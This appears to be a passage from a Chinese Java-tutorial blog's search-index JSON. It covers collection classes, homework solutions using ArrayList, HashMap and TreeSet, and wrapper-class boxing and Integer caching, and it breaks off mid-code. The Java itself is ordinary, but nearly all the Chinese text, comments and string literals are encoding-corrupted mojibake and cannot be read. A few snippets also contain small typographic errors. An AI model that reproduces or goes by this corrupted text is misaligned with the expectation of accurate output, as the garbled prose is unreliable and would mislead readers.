¹æ®é›†åˆå®ç°ç±»ç‰¹æ€§è¿›è¡Œé€‰æ‹©ï¼Œåˆ†æå¦‚ä¸‹:\n\nå…ˆåˆ¤æ–­å­˜å‚¨çš„ç±»å‹(ä¸€ç»„å¯¹è±¡[å•åˆ—]æˆ–ä¸€ç»„é”®å€¼å¯¹[åŒåˆ—])\n\n1. ä¸€ç»„å¯¹è±¡[å•åˆ—]: Collection æ¥å£\n\n- å…è®¸é‡å¤: List\n  - å¢åˆ å¤š: LinkedList-çº¿ç¨‹ä¸å®‰å…¨\n  - æ”¹æŸ¥å¤š: ArrayList-çº¿ç¨‹ä¸å®‰å…¨ã€Vector-çº¿ç¨‹å®‰å…¨\n- ä¸å…è®¸é‡å¤: Set\n  - æ— åº: HashSet\n  - æ’åº: TreeSet\n  - æ’å…¥å’Œå–å‡ºé¡ºåºä¸€è‡´: LinkedHashSet \n\n2. ä¸€ç»„é”®å€¼å¯¹[åŒåˆ—]: Map æ¥å£\n\n- é”®æ— åº: HashMap-çº¿ç¨‹ä¸å®‰å…¨ ã€Hashtable-çº¿ç¨‹å®‰å…¨\n- é”®æ’åº: TreeMap\n- é”®æ’å…¥å’Œå–å‡ºé¡ºåºä¸€è‡´: LinkedHashMap-çº¿ç¨‹ä¸å®‰å…¨\n- è¯»å–æ–‡ä»¶: Properties\n\n![](https://img.jwt1399.top/img/webp.png)\n\n\n\n### å‚è€ƒ\n\n- http://www.codebaoku.com/it-java/it-java-233918.html\n\n- [Javaé›†åˆæ¡†æ¶å›¾è§£_Zhou Jiangçš„åšå®¢-CSDNåšå®¢_javaé›†åˆå›¾è§£](https://blog.csdn.net/oman001/article/details/104843676)\n\n- [java-é›†åˆæ¡†æ¶åº•å±‚æ•°æ®ç»“æ„æ€»ç»“_Devil_566çš„åšå®¢-CSDNåšå®¢_javaé›†åˆåº•å±‚æ•°æ®ç»“æ„](https://blog.csdn.net/qq_28033239/article/details/98204664)\n- [é¢ç»æ‰‹å†Œ Â· ç¬¬8ç¯‡ã€ŠLinkedListæ’å…¥é€Ÿåº¦æ¯”ArrayListå¿«ï¼Ÿä½ ç¡®å®šå—ï¼Ÿã€‹ | bugstack è™«æ´æ ˆ](https://bugstack.cn/md/java/interview/2020-08-30-é¢ç»æ‰‹å†Œ Â· ç¬¬8ç¯‡ã€ŠLinkedListæ’å…¥é€Ÿåº¦æ¯”ArrayListå¿«ï¼Ÿä½ ç¡®å®šå—ï¼Ÿã€‹.html)\n- [HashTableè¯¦è§£_æ±‚offerçš„èœé¸¡çš„åšå®¢-CSDNåšå®¢](https://blog.csdn.net/qq_40050586/article/details/105720295?spm=1001.2014.3001.5502)\n- [è¶…è¯¦ç»†LinkedHashMapè§£æ](https://blog.csdn.net/qq_40050586/article/details/105851970?ops_request_misc=%7B%22request%5Fid%22%3A%22164138590416780265473460%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&request_id=164138590416780265473460&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-3-105851970.pc_search_insert_es_download_v2&utm_term=LinkHashMap&spm=1018.2226.3001.4187)\n- [javaé›†åˆåŒ…æ•°æ®ç»“æ„å›¾è§£](https://blog.csdn.net/weixin_43820542/article/details/99626015)\n\n##  äº”ã€æœ¬ç« ç»ƒä¹ \n\n###  1.ç¼–ç¨‹é¢˜Homework01.java\n\næŒ‰è¦æ±‚å®ç°:\n(1)å°è£…ä¸€ä¸ªæ–°é—»ç±»ï¼ŒåŒ…å«æ ‡é¢˜å’Œå†…å®¹å±æ€§ï¼Œæä¾›getã€ setæ–¹æ³•ï¼Œé‡å†™toStringæ–¹æ³•ï¼Œæ‰“å°å¯¹è±¡æ—¶åªæ‰“å°æ ‡é¢˜:\n(2)åªæä¾›ä¸€ä¸ªå¸¦å‚æ•°çš„æ„é€ å™¨ï¼Œå®ä¾‹åŒ–å¯¹è±¡æ—¶ï¼Œåªåˆå§‹åŒ–æ ‡é¢˜;å¹¶ä¸”å®ä¾‹åŒ–ä¸¤ä¸ªå¯¹è±¡:\n\n- æ–°é—»ä¸€:æ–°å† ç¡®è¯Šç—…ä¾‹è¶…åƒä¸‡ï¼Œæ•°ç™¾ä¸‡å°åº¦æ•™ä¿¡å¾’èµ´æ’æ²³â€œåœ£æµ´â€å¼•æ°‘ä¼—æ‹…å¿§\n- æ–°é—»äºŒ:ç”·å­çªç„¶æƒ³èµ·2ä¸ªæœˆå‰é’“çš„é±¼è¿˜åœ¨ç½‘å…œé‡Œï¼Œæèµ·ä¸€çœ‹èµ¶ç´§æ”¾ç”Ÿ\n\n(3)å°†æ–°é—»å¯¹è±¡æ·»åŠ åˆ°ArrayListé›†åˆä¸­ï¼Œå¹¶ä¸”è¿›è¡Œå€’åºéå†;\n(4)åœ¨éå†é›†åˆè¿‡ç¨‹ä¸­ï¼Œå¯¹æ–°é—»æ ‡é¢˜è¿›è¡Œå¤„ç†ï¼Œè¶…è¿‡15å­—çš„åªä¿ç•™å‰15ä¸ªï¼Œç„¶ååœ¨åè¾¹åŠ â€œ...â€\n(5)åœ¨æ§åˆ¶å°æ‰“å°éå†å‡ºç»è¿‡å¤„ç†çš„æ–°é—»æ ‡é¢˜;\n\n```java\npackage com.jwt.map_;\n\nimport java.util.ArrayList;\nimport java.util.Collections;\n\npublic class Homework01 {\n    public static void main(String[] args) {\n        News news1 = new News(\"æ–°é—»ä¸€:æ–°å† ç¡®è¯Šç—…ä¾‹è¶…åƒä¸‡ï¼Œæ•°ç™¾ä¸‡å°åº¦æ•™ä¿¡å¾’èµ´æ’æ²³â€œåœ£æµ´â€å¼•æ°‘ä¼—æ‹…å¿§\");\n        News news2 = new News(\"æ–°é—»äºŒ:ç”·å­çªç„¶æƒ³èµ·2ä¸ªæœˆå‰é’“çš„é±¼è¿˜åœ¨ç½‘å…œé‡Œï¼Œæèµ·ä¸€çœ‹èµ¶ç´§æ”¾ç”Ÿ\");\n        ArrayList<News> arrayList = new ArrayList<>();\n        arrayList.add(news1);\n        arrayList.add(news2);\n\n        //æ–¹æ³•ä¸€ï¼šä½¿ç”¨forå¾ªç¯å€’åº + å¤„ç†titleå‡½æ•°\n        for (int i = arrayList.size()-1; i >= 0 ; i--) {\n            News news = arrayList.get(i);\n            System.out.println(processTitle(news.getTitle()));\n        }\n\n        //æ–¹æ³•äºŒï¼šä½¿ç”¨Collectionså·¥å…·ç±»å€’åº +if\n        Collections.reverse(arrayList);//åè½¬List ä¸­å…ƒç´ çš„é¡ºåº\n        for (News news :arrayList) {\n            if (news.getTitle().length() > 15){\n                char[] chars = news.getTitle().toCharArray();\n                for (int i = 0; i < 15; i++) {\n                    System.out.print(chars[i]);\n                }\n                System.out.println(\"...\");\n            }\n        }\n\n    }\n\n    public static String processTitle(String title) {\n        if (title.length() > 15) {\n            return title.substring(0, 15) + \"...\";\n        } else {\n            return  title;\n        }\n    }\n\n}\n\n\nclass News{\n    private String title;\n    private String content;\n\n    public News(String title) {\n        this.title = title;\n    }\n\n    public String getTitle() {\n        return title;\n    }\n\n    public void setTitle(String title) {\n        this.title = title;\n    }\n\n    public String getContent() {\n        return content;\n    }\n\n    public void setContent(String content) {\n        this.content = content;\n    }\n\n    @Override\n    public String toString() {\n        return \"News{\" +\n                \"title='\" + title + '\\'' +\n                '}';\n    }\n}\n```\n\n### 2.ç¼–ç¨‹é¢˜Homework02.java\n\nä½¿ç”¨ ArrayList å®Œæˆå¯¹å¯¹è±¡ Car{name, price} çš„å„ç§æ“ä½œ\n\n- 1.add:æ·»åŠ å•ä¸ªå…ƒç´ \n- 2.remove:åˆ é™¤æŒ‡å®šå…ƒç´ \n- 3.contains:æŸ¥æ‰¾å…ƒç´ æ˜¯å¦å­˜åœ¨\n- 4.size:è·å–å…ƒç´ ä¸ªæ•°\n- 5.isEmpty:åˆ¤æ–­æ˜¯å¦ä¸ºç©º\n- 6.clear:æ¸…ç©º\n- 7.addAlI:æ·»åŠ å¤šä¸ªå…ƒç´ \n- 8.containsAll:æŸ¥æ‰¾å¤šä¸ªå…ƒç´ æ˜¯å¦éƒ½å­˜åœ¨\n- 9.ä½¿ç”¨å¢å¼ºforå’Œè¿­ä»£å™¨æ¥éå†æ‰€æœ‰çš„car ,éœ€è¦é‡å†™Carçš„toStringæ–¹æ³•\n- 10.removeAll: åˆ é™¤å¤šä¸ªå…ƒç´ \n\n```java\npackage com.jwt.map_;\n\nimport java.util.ArrayList;\nimport java.util.Iterator;\npublic class Homework02 {\n    public static void main(String[] args) {\n        Car car = new Car(\"å®é©¬\",400000);\n        Car car2 = new Car(\"å®¾åˆ©\", 5000000);\n\n        ArrayList<Car> arraylist = new ArrayList<>();\n        //1.add:æ·»åŠ å•ä¸ªå…ƒç´ \n        arraylist.add(car);\n        arraylist.add(car2);\n        System.out.println(\"arraylist = \" + arraylist);\n        //2.remove:åˆ é™¤æŒ‡å®šå…ƒç´ \n        arraylist.remove(car2);\n        System.out.println(\"arraylist = \" + arraylist);\n        //3.contains:æŸ¥æ‰¾å…ƒç´ æ˜¯å¦å­˜åœ¨\n        System.out.println(arraylist.contains(car));\n        //4.size:è·å–å…ƒç´ ä¸ªæ•°\n        System.out.println(arraylist.size());\n        //5.isEmpty:åˆ¤æ–­æ˜¯å¦ä¸ºç©º\n        System.out.println(arraylist.isEmpty());\n        //6.clear:æ¸…ç©º\n        arraylist.clear();\n        System.out.println(\"arraylist = \" + arraylist);\n        //7.addAlI:æ·»åŠ å¤šä¸ªå…ƒç´ \n        ArrayList<Car> arraylist2 = new ArrayList<>();\n        arraylist2.add(car);\n        arraylist2.add(car2);\n        arraylist.addAll(arraylist2);\n        System.out.println(\"arraylist = \" + arraylist);\n        //8.containsAll:æŸ¥æ‰¾å¤šä¸ªå…ƒç´ æ˜¯å¦éƒ½å­˜åœ¨\n        System.out.println(arraylist.containsAll(arraylist2));\n\n        //9.ä½¿ç”¨å¢å¼ºforå’Œè¿­ä»£å™¨æ¥éå†æ‰€æœ‰çš„car ,éœ€è¦é‡å†™Carçš„toStringæ–¹æ³•\n        //å¢å¼ºfor\n        for (Object o :arraylist) {\n            System.out.println(\"o = \" + o);\n        }\n        //è¿­ä»£å™¨\n        Iterator<Car> iterator = arraylist.iterator();\n        while (iterator.hasNext()) {\n            Car next = iterator.next();\n            System.out.println(\"next = \" + next);\n        }\n\n        //10.removeAll: åˆ é™¤å¤šä¸ªå…ƒç´ \n        arraylist.removeAll(arraylist2);\n        System.out.println(\"arraylist = \" + arraylist);\n    }\n\n}\n\nclass Car{\n    private String name;\n    private double price;\n\n    public Car(String name, double price) {\n        this.name = name;\n        this.price = price;\n    }\n\n    @Override\n    public String toString() {\n        return \"Car{\" +\n                \"name='\" + name + '\\'' +\n                \", price=\" + price +\n                '}';\n    }\n}\n```\n\n### 3.ç¼–ç¨‹é¢˜Homework03.java\n\næŒ‰è¦æ±‚å®Œæˆä¸‹åˆ—ä»»åŠ¡\n1)ä½¿ç”¨ HashMap ç±»å®ä¾‹åŒ–ä¸€ä¸ª Map ç±»å‹çš„å¯¹è±¡ m,é”®(String) å’Œå€¼(int) åˆ†åˆ«ç”¨äºå­˜å‚¨å‘˜å·¥çš„å§“åå’Œå·¥èµ„ï¼Œå­˜å…¥æ•°æ®å¦‚ä¸‹: jack-650å…ƒ; tom-1200å…ƒ; smith-2900å…ƒ;\n2)å°†jackçš„å·¥èµ„æ›´æ”¹ä¸º2600å…ƒ\n3)ä¸ºæ‰€æœ‰å‘˜å·¥å·¥èµ„åŠ è–ª100å…ƒ\n4)éå†é›†åˆä¸­æ‰€æœ‰çš„å‘˜å·¥\n5)éå†å”®åˆä¸­æ‰€æœ‰çš„å·¥èµ„\n\n```java\npackage com.jwt.map_;\n\nimport java.util.*;\npublic class Homework03 {\n    public static void main(String[] args) {\n        Map map = new HashMap();\n        map.put(\"jack\",650);\n        map.put(\"tom\",1200);\n        map.put(\"smith\",2900);\n        //å°†jackçš„å·¥èµ„æ›´æ”¹ä¸º2600å…ƒ\n        map.put(\"jack\",2600);\n        System.out.println(\"map = \" + map);\n        //ä¸ºæ‰€æœ‰å‘˜å·¥å·¥èµ„åŠ è–ª100å…ƒ\n        Set set = map.keySet();\n        for (Object key :set) {\n            map.put(key,(Integer)map.get(key)+100);\n        }\n        System.out.println(\"map = \" + map);\n        //éå†é›†åˆä¸­æ‰€æœ‰çš„å‘˜å·¥\n        Set set1 = map.entrySet();\n        Iterator iterator = set1.iterator();\n        while (iterator.hasNext()) {\n            Object next =  iterator.next();\n            Map.Entry m = (Map.Entry) next;\n            System.out.println(m.getKey() + \"-\" + m.getValue());\n        }\n        //éå†å”®åˆä¸­æ‰€æœ‰çš„å·¥èµ„\n        Collection values = map.values();\n        for (Object o :values) {\n            System.out.println(\"å·¥èµ„ = \" + o);\n        }\n    }\n}\n```\n\n### 4.ç®€ç­”é¢˜\n\nè¯•åˆ†æ HashSet å’Œ TreeSet åˆ†åˆ«å¦‚ä½•å®ç°å»é‡çš„ï¼Ÿ\n\n- (1) HashSet çš„å»é‡æœºåˆ¶: hashCode() + equals() ï¼Œåº•å±‚å…ˆé€šè¿‡å­˜å…¥å¯¹è±¡ï¼Œè¿›è¡Œè¿ç®—å¾—åˆ°ä¸€ä¸ª hash å€¼ï¼Œé€šè¿‡ hash å€¼å¾—åˆ°å¯¹åº”çš„ç´¢å¼•ï¼Œå¦‚æœå‘ç° tableç´¢å¼•æ‰€åœ¨çš„ä½ç½®ï¼Œæ²¡æœ‰æ•°æ®ï¼Œå°±ç›´æ¥å­˜æ”¾å¦‚æœæœ‰æ•°æ®ï¼Œå°±è¿›è¡Œ equals æ¯”è¾ƒ[éå†æ¯”è¾ƒ]ï¼Œ å¦‚æœæ¯”è¾ƒåï¼Œä¸ç›¸åŒï¼Œå°±åŠ å…¥ï¼Œå¦åˆ™å°±ä¸åŠ å…¥ã€‚\n- (2) TreeSetçš„å»é‡æœºåˆ¶ï¼šå¦‚æœä½ ä¼ å…¥äº†ä¸€ä¸ª Comparator åŒ¿åå¯¹è±¡ï¼Œå°±ä½¿ç”¨å®ç°çš„ compare å»é‡ï¼Œå¦‚æœæ–¹æ³•è¿”å› 0ï¼Œå°±è®¤ä¸ºæ˜¯ç›¸åŒçš„å…ƒç´ /æ•°æ®ï¼Œå°±ä¸æ·»åŠ ï¼›å¦‚æœä½ æ²¡æœ‰ä¼ å…¥ä¸€ä¸ª Comparator åŒ¿åå¯¹è±¡ï¼Œåˆ™ä»¥ä½ æ·»åŠ çš„å¯¹è±¡å®ç°çš„ Compareable æ¥å£çš„ compareTo å»é‡ã€‚\n\n### 5.ä»£ç åˆ†æé¢˜\n\nä¸‹é¢ä»£ç è¿è¡Œä¼šä¸ä¼šæŠ›å‡ºå¼‚å¸¸ï¼Œå¹¶ä»æºç å±‚é¢è¯´æ˜åŸå› [è€ƒå¯Ÿè¯»æºç +æ¥å£ç¼–ç¨‹+åŠ¨æ€ç»‘å®š]\n\n```java\nTreeSet treeSet = new TreeSet();\ntreeSet.add(new Person());\n```\n\nä¼šæŠ¥è½¬æ¢å¼‚å¸¸(ClassCastException)ï¼ŒPerson ç±»è¦å®ç° Compareable æ‰è¡Œ\n\nå› ä¸º TreeSet() æ„é€ å™¨æ²¡æœ‰ä¼ å…¥ Comparator æ¥å£çš„åŒ¿åå†…éƒ¨ç±»ï¼Œæ‰€ä»¥åœ¨åº•å±‚ä¼šæ‰§è¡Œ ComparabLe<? super K> k = (Comparable<? super K>) key; å³æŠŠ Perosn è½¬æˆ Comparable ç±»å‹ï¼Œæ‰€ä»¥ Person ç±»è¦å®ç° Compareable æ‰ä¸æŠ¥é”™\n\n```java\nclass Person implements Comparable{\n  \n    ....\n      \n    @Override\n    public int compareTo(Object o) {\n      return 0ï¼›\n    }\n}\n```\n\n### 6.ä»£ç åˆ†æé¢˜\n\nå·²çŸ¥: Person ç±»æŒ‰ç…§ id å’Œ name é‡å†™äº† hashCode å’Œ equals æ–¹æ³•ï¼Œé—®ä¸‹é¢ä»£ç è¾“å‡ºä»€ä¹ˆ?\n\n```java\nHashSet set = new HashSet();//ok\nPerson p1 = new Person(1001,\"AA\");//ok\nPerson p2 = new Person(1002,\"BB\");//ok\nset.add(p1);//ok\nset.add(p2);//ok\np1.name = \"CC\";\nset.remove(p1);//æ­¤å¤„è®¡ç®—â€œ1001-CCâ€çš„hashå€¼ï¼Œp1è¿˜å­˜åœ¨â€œ1001-AAâ€çš„hashå€¼çš„ä½ç½®ï¼Œæ‰€ä»¥åˆ é™¤ä¸æˆåŠŸ\nSystem.out.println(set); //2ä¸ªå¯¹è±¡\nset.add(new Person(1001,\"CC\"));//è®¡ç®—â€œ1001-CCâ€çš„hashï¼Œæ­¤å¤„ä¸ºç©ºï¼Œå¯ä»¥æ·»åŠ \nSystem.out.println(set); //3ä¸ªå¯¹è±¡ \nset.add(new Person(1001,\" AA\"));//è®¡ç®—â€œ1001-AAâ€çš„hashï¼Œæ­¤å¤„ä¸ä¸ºç©ºï¼Œè¿›è¡Œequalsæ¯”è¾ƒï¼Œp1å·²ç»å˜æˆâ€œ1001-CCâ€ï¼Œä¸ç›¸åŒï¼Œä¼šæŒ‚åœ¨p1åé¢ï¼Œæ·»åŠ æˆåŠŸ\nSystem.out.println(set) //4ä¸ªå¯¹è±¡  \n```\n\n##  å‚è€ƒ\n\n- [é€åˆ†é¢˜ï¼ŒArrayList çš„æ‰©å®¹æœºåˆ¶äº†è§£å—ï¼Ÿ - äº‘+ç¤¾åŒº - è…¾è®¯äº‘ (tencent.com)](https://cloud.tencent.com/developer/article/1810587?from=article.detail.1874923)\n- [ArrayListæºç è§£æ(åŸºäºJava8)æ‰©å®¹åˆ é™¤ - äº‘+ç¤¾åŒº - è…¾è®¯äº‘ (tencent.com)](https://cloud.tencent.com/developer/article/1124770?from=article.detail.1874923)\n- [ArrayListæºç +æ‰©å®¹æœºåˆ¶åˆ†æ - äº‘+ç¤¾åŒº - è…¾è®¯äº‘ (tencent.com)](https://cloud.tencent.com/developer/article/1874923)\n- [ArrayListæºç åˆ†æï¼ˆåŸºäºJDK8ï¼‰_Fighter168çš„åšå®¢-CSDNåšå®¢](https://blog.csdn.net/fighterandknight/article/details/61240861)\n- [ArrayList ä»æºç è§’åº¦å‰–æåº•å±‚åŸç†](https://hulunhao.com/2021/07/20/0defba1aec05404f1fa7b3f3956027b3/)\n- [LinkedList æºç è§£æ - æ˜é‡‘ (juejin.cn)](https://juejin.cn/post/7029148988473344014)\n- [LinkedList æºç è§£æ](https://juejin.cn/post/7010260543504138254)\n- [IDEAè°ƒè¯•debugæ—¶ï¼Œstepinto è¿›ä¸å»æ–¹æ³•å’Œæ•°æ®æ˜¾ç¤ºä¸å®Œæ•´çš„è§£å†³æ–¹æ³•](https://blog.csdn.net/qq_40839718/article/details/123464047)\n- [åœ¨Intellij IDEAä¸­ä½¿ç”¨Debug - bojiangzhou - åšå®¢å›­ (cnblogs.com)](https://www.cnblogs.com/chiangchou/p/idea-debug.html)\n\n## â¤ï¸Sponsor\n\næ‚¨çš„æ”¯æŒæ˜¯æˆ‘ä¸æ–­å‰è¿›çš„åŠ¨åŠ›ï¼Œå¦‚æœæ‚¨æ°å·§è´¢åŠ›é›„åšï¼Œåˆæ„Ÿè§‰æœ¬æ–‡å¯¹æ‚¨æœ‰æ‰€å¸®åŠ©çš„è¯ï¼Œå¯ä»¥è€ƒè™‘æ‰“èµä¸€ä¸‹æœ¬æ–‡ï¼Œç”¨ä»¥ç»´æŒæœ¬åšå®¢çš„è¿è¥è´¹ç”¨ï¼Œæ‹’ç»ç™½å«–ï¼Œä»ä½ æˆ‘åšèµ·ï¼ğŸ¥°ğŸ¥°ğŸ¥°\n\n<table>\n  <tbody>\n     <tr>\n         <td style=\"text-align:center;\">æ”¯ä»˜å®æ”¯ä»˜</td>\n         <td style=\"text-align:center;\">å¾®ä¿¡æ”¯ä»˜</td>\n     </tr>\n   <tr>\n    <td style=\"text-align:center;\" ><img width=\"200\" src=\"https://jwt1399.top/medias/reward/alipay.png\"></td>    \n      <td style=\"text-align:center;\"><img width=\"200\" src=\"https://jwt1399.top/medias/reward/sponor_wechat.png\"></td>     \n  </tr>\n</tbody></table>\n","tags":["é›†åˆ"],"categories":["JavaSE"]},{"title":"Java-å¸¸ç”¨ç±»","url":"/posts/33453.html","content":"\n## å‰è¨€\n\nå“ˆå–½ï¼å¤§å®¶å¥½ï¼Œæˆ‘æ˜¯å°ç®€ã€‚ä»Šå¤©å¼€å§‹å­¦ä¹ ã€ŠJava-å¸¸ç”¨ç±»ã€‹ï¼Œæ­¤ç³»åˆ—æ˜¯æˆ‘åšçš„ä¸€ä¸ª â€œJava ä» 0 åˆ° 1 â€ å®éªŒï¼Œç»™è‡ªå·±ä¸€å¹´å·¦å³æ—¶é—´ï¼ŒæŒ‰ç…§æˆ‘è‡ªå·±æ€»ç»“çš„ [Java-å­¦ä¹ è·¯çº¿](https://jwt1399.top/posts/29829.html)ï¼Œä» 0 å¼€å§‹å­¦ Java çŸ¥è¯†ï¼Œå¹¶ä¸å®šæœŸæ›´æ–°æ‰€å­¦ç¬”è®°ï¼ŒæœŸå¾…ä¸€å¹´åçš„èœ•å˜å§ï¼<æœ‰åŒæ ·æƒ³æ³•çš„å°ä¼™ä¼´ï¼Œå¯ä»¥è”ç³»æˆ‘ä¸€èµ·äº¤æµå­¦ä¹ å“¦ï¼>\n\n- [x] ğŸš©æ—¶é—´å®‰æ’ï¼šé¢„è®¡4å¤©æ›´æ–°å®Œ\n- [x] ğŸ¯å¼€å§‹æ—¶é—´ï¼š03-16\n- [x] ğŸ‰ç»“æŸæ—¶é—´ï¼š03-18\n- [x] ğŸ€æ€»ç»“ï¼šç”¨æ—¶ 3 å¤© \n\n## åŒ…è£…ç±»\n\n### ç®€ä»‹\n\nJava ä¸­çš„åŒ…è£…ç±»æä¾›äº†å°†**åŸºæœ¬æ•°æ®ç±»å‹è½¬æ¢ä¸ºå¯¹è±¡**ï¼Œä»¥åŠå°†**å¯¹è±¡è½¬æ¢ä¸ºåŸºæœ¬æ•°æ®ç±»å‹**çš„æœºåˆ¶ã€‚\n\n`java.lang`åŒ…çš„å…«ä¸ªç±»åœ¨ Java ä¸­ç§°ä¸ºåŒ…è£…ç±»ã€‚å…«ä¸ªåŒ…è£…ç±»çš„åˆ—è¡¨å¦‚ä¸‹ï¼š\n\n| åŸºæœ¬ç±»å‹ | åŒ…è£…ç±»    |\n| -------- | --------- |\n| byte     | Byte      |\n| short    | Short     |\n| int      | Integer   |\n| float    | Float     |\n| double   | Double    |\n| long     | Long      |\n| char     | Character |\n| boolean  | Boolean   |\n\n### **ä¸ºä»€ä¹ˆéœ€è¦åŒ…è£…ç±»ï¼Ÿ**\n\nåŒ…è£…ç±»æ˜¯ä¸€ä¸ªå¯¹è±¡ï¼ŒåŸºæœ¬ç±»å‹ä¸æ˜¯ã€‚å½“éœ€è¦ä¸€ä¸ªé€‚åˆåƒé¢å‘å¯¹è±¡ç¼–ç¨‹çš„ç±»å‹æ—¶å°±éœ€è¦åŒ…è£…ç±»ã€‚å½“å¸Œæœ›æ•°æ®ç±»å‹å˜å¾—ç®€å•æ—¶å°±ä½¿ç”¨åŸºæœ¬æ•°æ®ç±»å‹ã€‚åŸºæœ¬æ•°æ®ç±»å‹ä¸èƒ½ä¸º`null`ï¼Œä½†åŒ…è£…ç±»å¯ä»¥ä¸º`null`ã€‚åŒ…è£…ç±»å¯ç”¨äºå®ç°å¤šæ€æ€§ã€‚\n\n### è£…ç®±å’Œæ‹†ç®±\n\n- è£…ç®±ï¼šåŸºæœ¬ç±»å‹ -> åŒ…è£…ç±»å‹\n- æ‹†ç®±ï¼šåŒ…è£…ç±»å‹ ->  åŸºæœ¬ç±»å‹\n\n1) jdk5 å‰éœ€è¦**æ‰‹åŠ¨è£…ç®±å’Œæ‹†ç®±**\n2) jdk5 åŠå…¶ä»¥åé‡‡ç”¨**è‡ªåŠ¨è£…ç®±å’Œæ‹†ç®±**\n3) è‡ªåŠ¨è£…ç®±åº•å±‚è°ƒç”¨çš„æ˜¯ valueOf æ–¹æ³•ï¼Œæ¯”å¦‚ Integer.valueOf()\n\n```java\npackage com.jwt.wrapper;\n\n//æ¼”ç¤ºint <--> Integer çš„è£…ç®±å’Œæ‹†ç®±\npublic class Integer01 {\n  public static void main(String[] args) {\n    int n1 = 100;\n    //æ‰‹åŠ¨è£…ç®±\n    Integer integer = new Integer(n1);//æ–¹å¼1\n    Integer integer1 = Integer.valueOf(n1);//æ–¹å¼2\n    //æ‰‹åŠ¨æ‹†ç®±\n    int i = integer.intValue();\n\n    int n2 = 200;\n    //è‡ªåŠ¨è£…ç®±\n    Integer integer2 = n2; //åº•å±‚ä½¿ç”¨çš„æ˜¯Integer.valueOf(n2)\n    //è‡ªåŠ¨æ‹†ç®±\n    int n3 = integer2; //åº•å±‚ä»ç„¶ä½¿ç”¨çš„æ˜¯intValue()æ–¹æ³•\n\t}\n}\n```\n\n### åŒ…è£…ç±»å‹å’Œ String è½¬æ¢\n\n```java\npackage com.jwt.wrapper;\n\npublic class WrapperVSString {\n    public static void main(String[] args) {\n        //åŒ…è£…ç±»(Integer)->String\n        Integer i = 100;//è‡ªåŠ¨è£…ç®±\n        //æ–¹å¼1\n        String str1 = i + \"\";\n        //æ–¹å¼2\n        String str2 = i.toString();\n        //æ–¹å¼3\n        String str3 = String.valueOf(i);\n\n\n        //String -> åŒ…è£…ç±»(Integer)\n        String str4 = \"12345\";\n        Integer i2 = Integer.parseInt(str4);//ä½¿ç”¨åˆ°è‡ªåŠ¨è£…ç®±\n        Integer i3 = new Integer(str4);//æ„é€ å™¨\n        System.out.println(\"ok~~\");\n    }\n}\n```\n\n### Integerç±»å’ŒCharacterç±»çš„å¸¸ç”¨æ–¹æ³•\n\n```java\npackage com.jwt.wrapper;\n\npublic class WrapperMethod {\n    public static void main(String[] args) {\n        System.out.println(Integer.MIN_VALUE); //è¿”å›æœ€å°å€¼\n        System.out.println(Integer.MAX_VALUE);//è¿”å›æœ€å¤§å€¼\n        System.out.println(Character.isDigit('a'));//åˆ¤æ–­æ˜¯ä¸æ˜¯æ•°å­—\n        System.out.println(Character.isLetter('a'));//åˆ¤æ–­æ˜¯ä¸æ˜¯å­—æ¯\n        System.out.println(Character.isUpperCase('a'));//åˆ¤æ–­æ˜¯ä¸æ˜¯å¤§å†™\n        System.out.println(Character.isLowerCase('a'));//åˆ¤æ–­æ˜¯ä¸æ˜¯å°å†™\n        System.out.println(Character.isWhitespace('a'));//åˆ¤æ–­æ˜¯ä¸æ˜¯ç©ºæ ¼\n        System.out.println(Character.toUpperCase('a'));//è½¬æˆå¤§å†™\n        System.out.println(Character.toLowerCase('A'));//è½¬æˆå°å†™\n    }\n}\n```\n\n### é¢è¯•é¢˜\n\n#### é¢˜1\n\n```java\nInteger i = new Integer(1);\nInteger j = new Integer(1);\nSystem.out.println(i == j); \n\n//false\n//åˆ¤æ–­çš„æ˜¯ä¸¤ä¸ªå¯¹è±¡æ˜¯å¦ç›¸ç­‰ï¼Œéƒ½æ˜¯newçš„ä¸æƒ³ç­‰\n```\n\n#### é¢˜2\n\n```java\nInteger m = 1; //åº•å±‚Integer.valueOf(1); -> é˜…è¯»æºç \nInteger n = 1;//åº•å±‚Integer.valueOf(1);\nSystem.out.println(m == n); \n\n/*  valueOfæºç \n\npublic static Integer valueOf(int i) {\n\t\tif (i >= IntegerCache.low && i <= IntegerCache.high)\n\t\t\t\treturn IntegerCache.cache[i + (-IntegerCache.low)];\n    return new Integer(i);\n}\n\n*/\n\n//1. å¦‚æœ i åœ¨IntegerCache.low(-128)~IntegerCache.high(127),å°±ç›´æ¥ä»cacheæ•°ç»„è¿”å›\n//2. å¦‚æœä¸åœ¨-128~127,å°±ç›´æ¥new Integer(i)\n\n\n\n//true\n//1åœ¨èŒƒå›´ -128 ~ 127 å°±æ˜¯ç›´æ¥è¿”å›\n```\n\n#### é¢˜3\n\n```java\nInteger x = 128;//åº•å±‚Integer.valueOf(128);\nInteger y = 128;//åº•å±‚Integer.valueOf(128);\nSystem.out.println(x == y);\n\n//false\n//128ä¸åœ¨èŒƒå›´ -128 ~ 127 å°±ç›´æ¥new Integer(i)ï¼Œæ‰€ä»¥ä¸¤ä¸ªå¯¹è±¡ä¸åŒ\n```\n\n#### é¢˜4\n\n```java\n//ç¤ºä¾‹ä¸€\nInteger i1 = new Integer(127);\nInteger i2 = new Integer(127);\nSystem.out.println(i1 == i2);//F\n//ç¤ºä¾‹äºŒ\nInteger i3 = new Integer(128);\nInteger i4 = new Integer(128);\nSystem.out.println(i3 == i4);//F\n//ç¤ºä¾‹ä¸‰\nInteger i5 = 127;//åº•å±‚Integer.valueOf(127)\nInteger i6 = 127;//-128~127\nSystem.out.println(i5 == i6); //T\n//ç¤ºä¾‹å››\nInteger i7 = 128;\nInteger i8 = 128;\nSystem.out.println(i7 == i8);//F\n//ç¤ºä¾‹äº”\nInteger i9 = 127; //Integer.valueOf(127)\nInteger i10 = new Integer(127);\nSystem.out.println(i9 == i10);//F\n//ç¤ºä¾‹å…­\nInteger i11=127;\nint i12=127;\n//å¦‚æœæœ‰åŸºæœ¬æ•°æ®ç±»å‹ï¼Œåˆ¤æ–­çš„æ˜¯å€¼æ˜¯å¦ç›¸åŒ\nSystem.out.println(i11==i12); //T\n//ç¤ºä¾‹ä¸ƒ\nInteger i13=128;\nint i14=128;\nSystem.out.println(i13==i14);//T\n```\n\n#### æ€»ç»“\n\n- Integer integer = 123; //è‡ªåŠ¨è£…ç®±åº•å±‚ä½¿ç”¨çš„æ˜¯Integer.valueOf(123)\n\n```java\n//valueOfæºç \n\npublic static Integer valueOf(int i) 